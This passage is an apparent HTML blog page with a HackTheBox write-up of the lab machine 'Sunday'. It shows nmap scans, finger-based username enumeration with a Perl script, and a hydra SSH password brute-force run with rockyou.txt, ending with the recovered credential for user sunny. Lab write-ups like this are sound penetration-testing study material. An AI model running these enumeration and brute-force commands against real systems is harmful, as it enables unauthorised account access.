@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Sunday | On this article I am going to demo a machine called Sunday from hackthebox. Initial Nmap As usual we start our enumeration with nmap. I...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.3/jquery.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Sunday</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation">
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="https://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (12)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (14)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2019-12-07 06:11:00+00:00">Sat 07 December 2019</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Sunday.html">Sunday</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Sunday.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>On this article I am going to demo a machine called Sunday from hackthebox.</p>
+<h1>Initial Nmap</h1>
+<p>As usual we start our enumeration with nmap. I initially ran an nmap on the default ports but since I wasn't going anywhere I decided to run a full scan with the "-p-" parameter and indeed I got two extra non-default ports. After all, in a real engagement we will most probably run a full scan unless there are any specific reasons to do otherwise.</p>
+<div class="highlight"><pre><span></span><span class="k">user</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="n">oA</span><span class="w"> </span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">sunday</span><span class="o">/</span><span class="n">allPorts_nmap</span><span class="w"> </span><span class="mf">10.10.10.76</span><span class="w"> </span><span class="c1">--max-retries 0</span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2019</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">07</span><span class="w"> </span><span class="mi">07</span><span class="err">:</span><span class="mi">01</span><span class="w"> </span><span class="n">GMT</span><span class="w"></span>
+<span class="nl">Warning</span><span class="p">:</span><span class="w"> </span><span class="mf">10.10.10.76</span><span class="w"> </span><span class="n">giving</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="n">because</span><span class="w"> </span><span class="n">retransmission</span><span class="w"> </span><span class="n">cap</span><span class="w"> </span><span class="n">hit</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">10.10.10.76</span><span class="w"></span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.11</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span>
+<span class="ow">Not</span><span class="w"> </span><span class="nl">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">62619</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">ports</span><span class="p">,</span><span class="w"> </span><span class="mi">2912</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w"></span>
+<span class="n">PORT</span><span class="w">      </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"></span>
+<span class="mi">79</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="k">open</span><span class="w">  </span><span class="n">finger</span><span class="w"></span>
+<span class="mi">111</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">rpcbind</span><span class="w"></span>
+<span class="mi">22022</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="k">unknown</span><span class="w"></span>
+<span class="mi">47869</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="k">unknown</span><span class="w"></span>
+
+<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">110.91</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span>
+</pre></div>
+
+
+<p>Since the non-default ports found have unknown services I run another targeted scan on these ports to see if I can find out more.</p>
+<div class="highlight"><pre><span></span><span class="k">user</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">22022</span><span class="p">,</span><span class="mi">47869</span><span class="w"> </span><span class="mf">10.10.10.76</span><span class="w"></span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2019</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">07</span><span class="w"> </span><span class="mi">07</span><span class="err">:</span><span class="mi">06</span><span class="w"> </span><span class="n">GMT</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">10.10.10.76</span><span class="w"></span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.097</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span>
+
+<span class="n">PORT</span><span class="w">      </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">VERSION</span><span class="w"></span>
+<span class="mi">22022</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">SunSSH</span><span class="w"> </span><span class="mf">1.3</span><span class="w"> </span><span class="p">(</span><span class="n">protocol</span><span class="w"> </span><span class="mf">2.0</span><span class="p">)</span><span class="w"></span>
+<span class="mi">47869</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">rpcbind</span><span class="w"></span>
+
+<span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">29.28</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span>
+</pre></div>
+
+
+<p>The above scan tells us that an ssh service is running on port 22022 and an rcpbind service on port 47869.</p>
+<h1>Enumerating users with <em>finger</em></h1>
+<p>In the first scan we found the <a href="https://en.wikipedia.org/wiki/Finger_protocol#Application_support">finger</a> service running on port 79. Finger is a simple network protocol that allows clients to request users information to a server running the finger service. The program can provide information such as whether a user is currently logged on, the email address, full name, etc. This is an old protocol and although might have been considered useful in the past, today its use is quite questionable in terms of privacy and security.  </p>
+<p>To query the server you can do something similar from a machine where the finger client is installed:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="p">@</span><span class="nl">Kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="n">finger</span> <span class="mf">@10.10.10.76</span>
+<span class="n">No</span> <span class="n">one</span> <span class="n">logged</span> <span class="n">on</span>
+<span class="n">root</span><span class="p">@</span><span class="nl">Kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="n">finger</span> <span class="n">test</span><span class="mf">@10.10.10.76</span>
+<span class="n">Login</span>       <span class="n">Name</span>               <span class="n">TTY</span>         <span class="n">Idle</span>    <span class="n">When</span>    <span class="n">Where</span>
+<span class="n">test</span>                  <span class="o">???</span>
+<span class="n">root</span><span class="p">@</span><span class="nl">Kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="n">finger</span> <span class="n">root</span><span class="mf">@10.10.10.76</span>
+<span class="n">Login</span>       <span class="n">Name</span>               <span class="n">TTY</span>         <span class="n">Idle</span>    <span class="n">When</span>    <span class="n">Where</span>
+<span class="n">root</span>     <span class="n">Super</span><span class="o">-</span><span class="n">User</span>            <span class="n">pts</span><span class="o">/</span><span class="mi">3</span>        <span class="o">&lt;</span><span class="n">Apr</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2018</span><span class="o">&gt;</span> <span class="n">sunday</span>              
+<span class="n">root</span><span class="p">@</span><span class="nl">Kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> 
+</pre></div>
+
+
+<p>The first command tells us there is no one currently logged on on the box. In the second command I just use test as the user as I don't know any user names. Last I use root and I got some information. Now, since we know ssh is running we could definitely try to brute-force using root but it is highly unlikely we can get in as ssh root login could be disabled. To have more chances of success we should find out other users present in the box and then see if we can get in using one of them.</p>
+<p>While doing some research online I found a tool at <a href="http://pentestmonkey.net/tools/user-enumeration/finger-user-enum">pentestmonkey</a> called finger-user-enum.pl. This simple perl script can help us querying the server to gather information on users. I think there is also a metasploit module that can assist on that but I prefer to use manual scripts as much as I can.</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="p">@</span><span class="nl">Kali</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">perl</span> <span class="n">finger</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="k">enum</span><span class="p">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">U</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">SecLists</span><span class="o">/</span><span class="n">Usern</span>
+<span class="n">ames</span><span class="o">/</span><span class="n">Names</span><span class="o">/</span><span class="n">names</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">t</span> <span class="mf">10.10.10.76</span><span class="o">|</span> <span class="n">less</span> <span class="o">-</span><span class="n">S</span>
+
+<span class="n">Starting</span> <span class="n">finger</span><span class="o">-</span><span class="n">user</span><span class="o">-</span><span class="k">enum</span> <span class="n">v1</span><span class="mf">.0</span> <span class="p">(</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//pentestmonkey.net/tools/finger-user-enum )</span>
+
+ <span class="o">----------------------------------------------------------</span>
+<span class="o">|</span>                   <span class="n">Scan</span> <span class="n">Information</span>                       <span class="o">|</span>
+ <span class="o">----------------------------------------------------------</span>
+
+<span class="n">Worker</span> <span class="n">Processes</span> <span class="p">.........</span> <span class="mi">5</span>
+<span class="n">Usernames</span> <span class="n">file</span> <span class="p">...........</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">SecLists</span><span class="o">/</span><span class="n">Usernames</span><span class="o">/</span><span class="n">Names</span><span class="o">/</span><span class="n">names</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">Target</span> <span class="n">count</span> <span class="p">.............</span> <span class="mi">1</span>
+<span class="n">Username</span> <span class="n">count</span> <span class="p">...........</span> <span class="mi">10163</span>
+<span class="n">Target</span> <span class="n">TCP</span> <span class="n">port</span> <span class="p">..........</span> <span class="mi">79</span>
+<span class="n">Query</span> <span class="n">timeout</span> <span class="p">............</span> <span class="mi">5</span> <span class="n">secs</span>
+<span class="n">Relay</span> <span class="n">Server</span> <span class="p">.............</span> <span class="n">Not</span> <span class="n">used</span>
+
+<span class="cp">######## Scan started at Sat Dec  7 07:01:58 2019 #########</span>
+<span class="n">access</span><span class="mf">@10.10.10.76</span><span class="o">:</span> <span class="n">access</span> <span class="n">No</span> <span class="n">Access</span> <span class="n">User</span>                     <span class="o">&lt;</span> <span class="p">.</span>  <span class="p">.</span>  <span class="p">.</span>  <span class="p">.</span> <span class="o">&gt;</span><span class="p">..</span><span class="n">nobody4</span>  <span class="n">SunOS</span> <span class="mf">4.</span><span class="n">x</span> <span class="n">NFS</span> <span class="n">Anonym</span>               <span class="o">&lt;</span> <span class="p">.</span>  <span class="p">.</span>  <span class="p">.</span>  <span class="p">.</span> <span class="o">&gt;</span><span class="p">..</span>
+<span class="n">admin</span><span class="mf">@10.10.10.76</span><span class="o">:</span> <span class="n">Login</span>       <span class="n">Name</span>               <span class="n">TTY</span>         <span class="n">Idle</span>    <span class="n">When</span>    <span class="n">Where</span><span class="p">..</span><span class="n">adm</span>      <span class="n">Admin</span>                              <span class="o">&lt;</span> <span class="p">.</span>  <span class="p">.</span>  <span class="p">.</span>  <span class="p">.</span> <span class="o">&gt;</span><span class="p">..</span><span class="n">lp</span>       <span class="n">Line</span> <span class="n">Printer</span> <span class="n">Admin</span>                 <span class="o">&gt;</span>
+<span class="n">anne</span> <span class="n">marie</span><span class="mf">@10.10.10.76</span><span class="o">:</span> <span class="n">Login</span>       <span class="n">Name</span>               <span class="n">TTY</span>         <span class="n">Idle</span>    <span class="n">When</span>    <span class="n">Where</span><span class="p">..</span><span class="n">anne</span>                  <span class="o">???</span><span class="p">..</span><span class="n">marie</span>                 <span class="o">???</span><span class="p">..</span>
+<span class="n">bin</span><span class="mf">@10.10.10.76</span><span class="o">:</span> <span class="n">bin</span>             <span class="o">???</span>                         <span class="o">&lt;</span> <span class="p">.</span>  <span class="p">.</span>  <span class="p">.</span>  <span class="p">.</span> <span class="o">&gt;</span><span class="p">..</span>
+<span class="n">dee</span> <span class="n">dee</span><span class="mf">@10.10.10.76</span><span class="o">:</span> <span class="n">Login</span>       <span class="n">Name</span>               <span class="n">TTY</span>         <span class="n">Idle</span>    <span class="n">When</span>    <span class="n">Where</span><span class="p">..</span><span class="n">dee</span>                   <span class="o">???</span><span class="p">..</span><span class="n">dee</span>                   <span class="o">???</span><span class="p">..</span>
+<span class="n">la</span> <span class="n">verne</span><span class="mf">@10.10.10.76</span><span class="o">:</span> <span class="n">Login</span>       <span class="n">Name</span>               <span class="n">TTY</span>         <span class="n">Idle</span>    <span class="n">When</span>    <span class="n">Where</span><span class="p">..</span><span class="n">la</span>                    <span class="o">???</span><span class="p">..</span><span class="n">verne</span>                 <span class="o">???</span><span class="p">..</span>
+<span class="n">message</span><span class="mf">@10.10.10.76</span><span class="o">:</span> <span class="n">Login</span>       <span class="n">Name</span>               <span class="n">TTY</span>         <span class="n">Idle</span>    <span class="n">When</span>    <span class="n">Where</span><span class="p">..</span><span class="n">smmsp</span>    <span class="n">SendMail</span> <span class="n">Message</span> <span class="n">Sub</span>               <span class="o">&lt;</span> <span class="p">.</span>  <span class="p">.</span>  <span class="p">.</span>  <span class="p">.</span> <span class="o">&gt;</span><span class="p">..</span>
+<span class="n">miof</span> <span class="n">mela</span><span class="mf">@10.10.10.76</span><span class="o">:</span> <span class="n">Login</span>       <span class="n">Name</span>               <span class="n">TTY</span>         <span class="n">Idle</span>    <span class="n">When</span>    <span class="n">Where</span><span class="p">..</span><span class="n">miof</span>                  <span class="o">???</span><span class="p">..</span><span class="n">mela</span>                  <span class="o">???</span><span class="p">..</span>
+<span class="n">sammy</span><span class="mf">@10.10.10.76</span><span class="o">:</span> <span class="n">sammy</span>                 <span class="n">pts</span><span class="o">/</span><span class="mi">2</span>        <span class="o">&lt;</span><span class="n">Apr</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2018</span><span class="o">&gt;</span> <span class="mf">10.10.14.4</span>          <span class="p">..</span>
+<span class="n">sunny</span><span class="mf">@10.10.10.76</span><span class="o">:</span> <span class="n">sunny</span>                 <span class="n">pts</span><span class="o">/</span><span class="mi">3</span>        <span class="o">&lt;</span><span class="n">Apr</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2018</span><span class="o">&gt;</span> <span class="mf">10.10.14.4</span>          <span class="p">..</span>
+<span class="n">sys</span><span class="mf">@10.10.10.76</span><span class="o">:</span> <span class="n">sys</span>             <span class="o">???</span>                         <span class="o">&lt;</span> <span class="p">.</span>  <span class="p">.</span>  <span class="p">.</span>  <span class="p">.</span> <span class="o">&gt;</span><span class="p">..</span>
+<span class="cp">######## Scan completed at Sat Dec  7 07:39:50 2019 #########</span>
+<span class="mi">11</span> <span class="n">results</span><span class="p">.</span>
+
+<span class="mi">10163</span> <span class="n">queries</span> <span class="k">in</span> <span class="mi">2272</span> <span class="n">seconds</span> <span class="p">(</span><span class="mf">4.5</span> <span class="n">queries</span> <span class="o">/</span> <span class="n">sec</span><span class="p">)</span>
+</pre></div>
+
+
+<p>The above output contains interesting results. Particularly we can see the users <code>sammy</code> and <code>sunny</code> use a pts terminal instead of a tty like the rest of users. Furthermore, the <code>root</code> user is missing from the list and probably because it is not included in the names.txt file. We know, however, from the test we did before that the <code>root</code> user uses the same terminal as the users <code>sammy</code> and <code>sunny</code> so these are probably the users we are looking for.</p>
+<h1>SSH brute force</h1>
+<p>So now I start an ssh brute-force attack using hydra against the user sunny. To do that I used a standard passwords list, called rockyou, you can find in Kali:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mi">22022</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="n">sunny</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="mi">50</span><span class="w"> </span><span class="mi">1</span><span class="w"></span>
+<span class="mf">0.10.10.76</span><span class="w"> </span><span class="n">ssh</span><span class="w">                                                                  </span>
+<span class="n">Hydra</span><span class="w"> </span><span class="n">v9</span><span class="mf">.0</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">van</span><span class="w"> </span><span class="n">Hauser</span><span class="o">/</span><span class="n">THC</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">military</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">organizations</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">illegal</span><span class="w"> </span><span class="n">purposes</span><span class="p">.</span><span class="w"></span>
+
+<span class="n">Hydra</span><span class="w"> </span><span class="p">(</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vanhauser</span><span class="o">-</span><span class="n">thc</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2019</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">12</span><span class="w"> </span><span class="mi">10</span><span class="err">:</span><span class="mi">34</span><span class="err">:</span><span class="mi">10</span><span class="w"></span>
+<span class="o">[</span><span class="n">WARNING</span><span class="o">]</span><span class="w"> </span><span class="n">Many</span><span class="w"> </span><span class="n">SSH</span><span class="w"> </span><span class="n">configurations</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">number</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">parallel</span><span class="w"> </span><span class="n">tasks</span><span class="p">,</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">recommended</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">reduce</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nl">tasks</span><span class="p">:</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="mi">4</span><span class="w"></span>
+<span class="o">[</span><span class="n">DATA</span><span class="o">]</span><span class="w"> </span><span class="nf">max</span><span class="w"> </span><span class="mi">50</span><span class="w"> </span><span class="n">tasks</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="n">overall</span><span class="w"> </span><span class="mi">50</span><span class="w"> </span><span class="n">tasks</span><span class="p">,</span><span class="w"> </span><span class="mi">14344399</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="p">(</span><span class="nl">l</span><span class="p">:</span><span class="mi">1</span><span class="o">/</span><span class="nl">p</span><span class="p">:</span><span class="mi">14344399</span><span class="p">),</span><span class="w"> </span><span class="o">~</span><span class="mi">286888</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="n">task</span><span class="w"></span>
+<span class="o">[</span><span class="n">DATA</span><span class="o">]</span><span class="w"> </span><span class="n">attacking</span><span class="w"> </span><span class="nl">ssh</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.76</span><span class="err">:</span><span class="mi">22022</span><span class="o">/</span><span class="w"></span>
+<span class="o">[</span><span class="n">STATUS</span><span class="o">]</span><span class="w"> </span><span class="mf">891.00</span><span class="w"> </span><span class="n">tries</span><span class="o">/</span><span class="nf">min</span><span class="p">,</span><span class="w"> </span><span class="mi">891</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mi">00</span><span class="err">:</span><span class="mi">01</span><span class="n">h</span><span class="p">,</span><span class="w"> </span><span class="mi">14343609</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mi">268</span><span class="err">:</span><span class="mi">19</span><span class="n">h</span><span class="p">,</span><span class="w"> </span><span class="mi">50</span><span class="w"> </span><span class="n">active</span><span class="w"></span>
+<span class="o">[</span><span class="n">STATUS</span><span class="o">]</span><span class="w"> </span><span class="mf">587.67</span><span class="w"> </span><span class="n">tries</span><span class="o">/</span><span class="nf">min</span><span class="p">,</span><span class="w"> </span><span class="mi">1763</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mi">00</span><span class="err">:</span><span class="mi">03</span><span class="n">h</span><span class="p">,</span><span class="w"> </span><span class="mi">14342737</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mi">406</span><span class="err">:</span><span class="mi">47</span><span class="n">h</span><span class="p">,</span><span class="w"> </span><span class="mi">50</span><span class="w"> </span><span class="n">active</span><span class="w"></span>
+<span class="o">[</span><span class="n">ERROR</span><span class="o">]</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">does</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">support</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">auth</span><span class="w"></span>
+<span class="o">[</span><span class="n">22022</span><span class="o">][</span><span class="n">ssh</span><span class="o">]</span><span class="w"> </span><span class="k">host</span><span class="err">:</span><span class="w"> </span><span class="mf">10.10.10.76</span><span class="w">   </span><span class="nl">login</span><span class="p">:</span><span class="w"> </span><span class="n">sunny</span><span class="w">   </span><span class="nl">password</span><span class="p">:</span><span class="w"> </span><span class="n">sunday</span><span class="w"></span>
+<span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">successfully</span><span class="w"> </span><span class="n">completed</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">found</span><span class="w"></span>
